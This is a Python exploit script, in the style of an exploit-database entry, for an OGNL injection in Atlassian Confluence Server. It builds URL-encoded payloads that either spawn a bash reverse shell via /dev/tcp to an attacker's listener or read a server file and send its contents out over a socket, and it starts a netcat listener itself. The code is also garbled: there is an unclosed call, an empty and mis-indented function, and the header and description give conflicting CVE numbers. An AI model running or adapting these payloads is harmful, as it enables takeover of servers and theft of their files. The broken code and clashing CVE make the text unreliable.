# Exploit Title: Confluence Namespace OGNL Injection
# Date: June 3, 2022
# Exploit Author: Jacob Baines
# Vendor Homepage: https://www.atlassian.com/software/confluence
# Software Link: https://www.atlassian.com/software/confluence/download-archives
# Vendor Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
# Version: All LTS <= 7.13.6 and all others <= 7.18.0
# Tested on: 7.13.6 LTS / Ubuntu 20.04
# CVE : CVE-2022-26123

import urllib.parse
import urllib3
import argparse
import requests
import time
import sys
import os

urllib3.disable_warnings(

    def do_banner():
        
if __name__ == "__main__":

    do_banner()
    
    parser = argparse.ArgumentParser(description='Atlassian Confluence Server exploit (CVE-2022-26134)')
    parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to exploit")
    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to exploit", default=443)
    parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The local address to connect back to")
    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default=1270)
    parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="https://")
    parser.add_argument('--reverse-shell', action="store_true", dest="reverse_shell", default=False, help="Execute a bash shell")
    parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, help="Directs the program to start an nc listener")
    parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
    parser.add_argument('--read-file', action="store", dest="read_file", help="From memory, read the provided file")
    args = parser.parse_args()

    if args.reverse_shell and args.read_file:
        print("[-] User specified both reverse shell and read file. Only one may be chosen.")
        sys.exit(1)
    
    if not args.reverse_shell and not args.read_file:
        print("[-] User selected neither reverse shell nor read file. One must be selected.")
        sys.exit(1)  # Added exit for this condition to prevent proceeding

    if not args.fork_nc:
        print("[!] User has opted not to fork nc")
    else:
        pid = os.fork()
        if pid > 0:
            print('[+] Forking a netcat listener')
            print('[+] Using ' + args.ncpath)
            os.execv(args.ncpath, [args.ncpath, '-lvnp', str(args.lport)])  # Fixed argument splitting
            sys.exit(0)

    if args.reverse_shell:
        print('[+] Generating a reverse shell payload')
        exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'

    if args.read_file:
        print('[+] Generating a payload to read: ' + args.read_file)
        exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + '); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();"))}'

    encoded_exploit = urllib.parse.quote(exploit)
    target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/'
    print('[+] Sending exploit at ' + target_url)  # Fixed spelling of "exploit"
    target_url += encoded_exploit
    target_url += '/'

    try:
        requests.get(target_url)
    except Exception as e:  # Catch exceptions and print the error
        print('[-] The HTTP request failed:', e)
        sys.exit(0)
